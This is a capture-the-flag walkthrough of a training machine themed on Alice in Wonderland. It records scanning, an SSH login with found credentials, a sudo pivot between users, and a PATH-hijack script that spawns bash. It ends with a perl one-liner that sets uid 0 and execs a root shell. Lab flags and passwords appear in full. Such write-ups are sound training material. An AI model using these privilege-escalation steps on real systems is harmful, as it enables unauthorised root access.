# Writeups


first we have an IP adress, and this IP it is *10.10.174.219*, ok and now we are going to do 
some scanning on this for seeing what it is possible with this, and we are going to do it 
with the famous tools who call NMAP :

====Nmap recon ====
```
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDe20sKMgKSMTnyRTmZhXPxn+xLggGUemXZLJDkaGAkZSMgwM3taNTc8OaEku7BvbOkqoIya4ZI8vLuNdMnESFfB22kMWfkoB0zKCSWzaiOjvdMBw559UkLCZ3bgwDY2RudNYq5YEwtqQMFgeRCC1/rO4h4Hl0YjLJufYOoIbK0EPaClcDPYjp+E1xpbn3kqKMhyWDvfZ2ltU1Et2MkhmtJ6TH2HA+eFdyMEQ5SqX6aASSXM7OoUHwJJmptyr2aNeUXiytv7uwWHkIqk3vVrZBXsyjW4ebxC3v0/Oqd73UWd5epuNbYbBNls06YZDVI8wyZ0eYGKwjtogg5+h82rnWN
|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHH2gIouNdIhId0iND9UFQByJZcff2CXQ5Esgx1L96L50cYaArAW3A3YP3VDg4tePrpavcPJC2IDonroSEeGj6M=
|   256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAsWAdr9g04J7Q8aeiWYg03WjPqGVS6aNf/LF+/hMyKh
80/tcp open  http    syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Follow the white rabbit.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
this is not an important things so the 2nd  thing, we are going to the index page for this room,
we indicate us and inspect the source code, that said
```
Follow the White Rabbit.

"Curiouser and curiouser!" cried Alice (she was so much surprised, that for the moment she quite forgot how to speak good English)

[IMGAGE]
```
we can note one important information about the person who speak, and this name it's *Alice* 
(username of the machine maybe), and maybe *White Rabbit* also, then 3rd thing,I tried to 
scan directory, I found a lot of things who can help me :
```
Dir found: / - 200
Dir found: /img/ - 200
Dir found: /r/ - 200
Dir found: /r/a/ - 200
Dir found: /r/a/b/ - 200
Dir found: /r/a/b/b/ - 200
Dir found: /r/a/b/b/i/ - 200
Dir found: /r/a/b/b/i/t/ - 200
```
the last one `http://10.10.174.219/r/a/b/b/i/t/` and surprise me, I opened all the dirs I found 
the a message who indicate me that I unlocked the door :
```
Open the door and enter wonderland

"Oh, you’re sure to do that," said the Cat, "if you only walk long enough."

Alice felt that this could not be denied, so she tried another question. "What sort of people live about here?"

"In that direction,"" the Cat said, waving its right paw round, "lives a Hatter: and in that direction," waving the other paw, "lives a March Hare. Visit either you like: they’re both mad."
```
and I obtained that : `alice:HowDothTheLittleCrocodileImproveHisShiningTail` and I'm sure it's 
a very important things maybe like as a couple username:password, and I'm going to try to connect 
me on the ssh server with this.

YESSSS that's true I finally have access to the system ssh and now I see 2 files and the folder 
of user alice and the others users isn't open to alice but explore the system now

I saw a script I execute it and he gave me that 
```
alice@wonderland:~$ python3 walrus_and_the_carpenter.py 
The line was:    And yet another four;
The line was:    Meaning to say he did not choose
The line was:    "Is what we chiefly need:
The line was:    
The line was:    Their shoes were clean and neat —
The line was:    
The line was:    "But wait a bit," the Oysters cried,
The line was:    And you are very nice!"
The line was:    Were walking close at hand;
The line was:  
```
I understand nothing but I am going to continue my inspecting process.


fortunately I saw something in the sudoers note

```
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```
But wait I visited the directory /root and I had had access then usually we don't have 
access to read the content of everyfolders but you can read and navigate on this

`/root/user.txt`, here the 1st flag

1. thm{"Curiouser and curiouser!"}


COntinue ...

now come back to the sudoers notes `sudo -l`, after I received the path,I execute the file 
with the user rabbit , like that

`sudo -u rabbit <path file python>`

and I have just been to escalate the privilege to user rabbit, now I return back to my userfile 
the `home/rabbit`, I have a file who name "teaParty", and I am going to execute him with the command 
`./teaParty`, but there not so much thing so important therefore I am going to download the file on 
my machin with the http.server from python

`python3 -m http.server [ http://iphost:port/ ]`

after that I am going to see all of strings who has in this file 

*strings teaParty*===content===
```
/lib64/ld-linux-x86-64.so.2
2U~4
libc.so.6
setuid
puts
getchar
system
__cxa_finalize
setgid
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u/UH
[]A\A]A^A_
Welcome to the tea party!
The Mad Hatter will be here soon.
/bin/echo -n 'Probably by ' && date --date='next hour' -R
Ask very nicely, and I will give you some tea while you wait for him
Segmentation fault (core dumped)
;*3$"
GCC: (Debian 8.3.0-6) 8.3.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.7325
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
teaParty.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
puts@@GLIBC_2.2.5
_edata
system@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
getchar@@GLIBC_2.2.5
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
setgid@@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
setuid@@GLIBC_2.2.5
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got.plt
.data
.bss
.comment
```

There are some information very important like as 
```
Welcome to the tea party!
The Mad Hatter will be here soon.
/bin/echo -n 'Probably by ' && date --date='next hour' -R
Ask very nicely, and I will give you some tea while you wait for him
Segmentation fault (core dumped)
```
and now we are going to create a file who will help us for escalate the privilege another time again

`date.sh`==content===
```
#!/bin/bash
echo ""
echo "DATE HIJACKED"
/bin/bash
~
```
and after that I have exported the path just in the objectives to reload the path and 
I escalate the privilege. I have just arrived on the directory home and I see a file who 
his name is password.txt(`WhyIsARavenLikeAWritingDesk?`) and now I am going to access with 
the ssh for have many privileges

`ssh hatter@ip`, after the connection I executed the command

`/usr/bin/perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'`

but where I found this command I hosted a file "linpeas" on my machine and  I upload this file on the remote machine and I executed this and I have a notif who told me that file have been executed with success
and the flag 

2. *thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}*
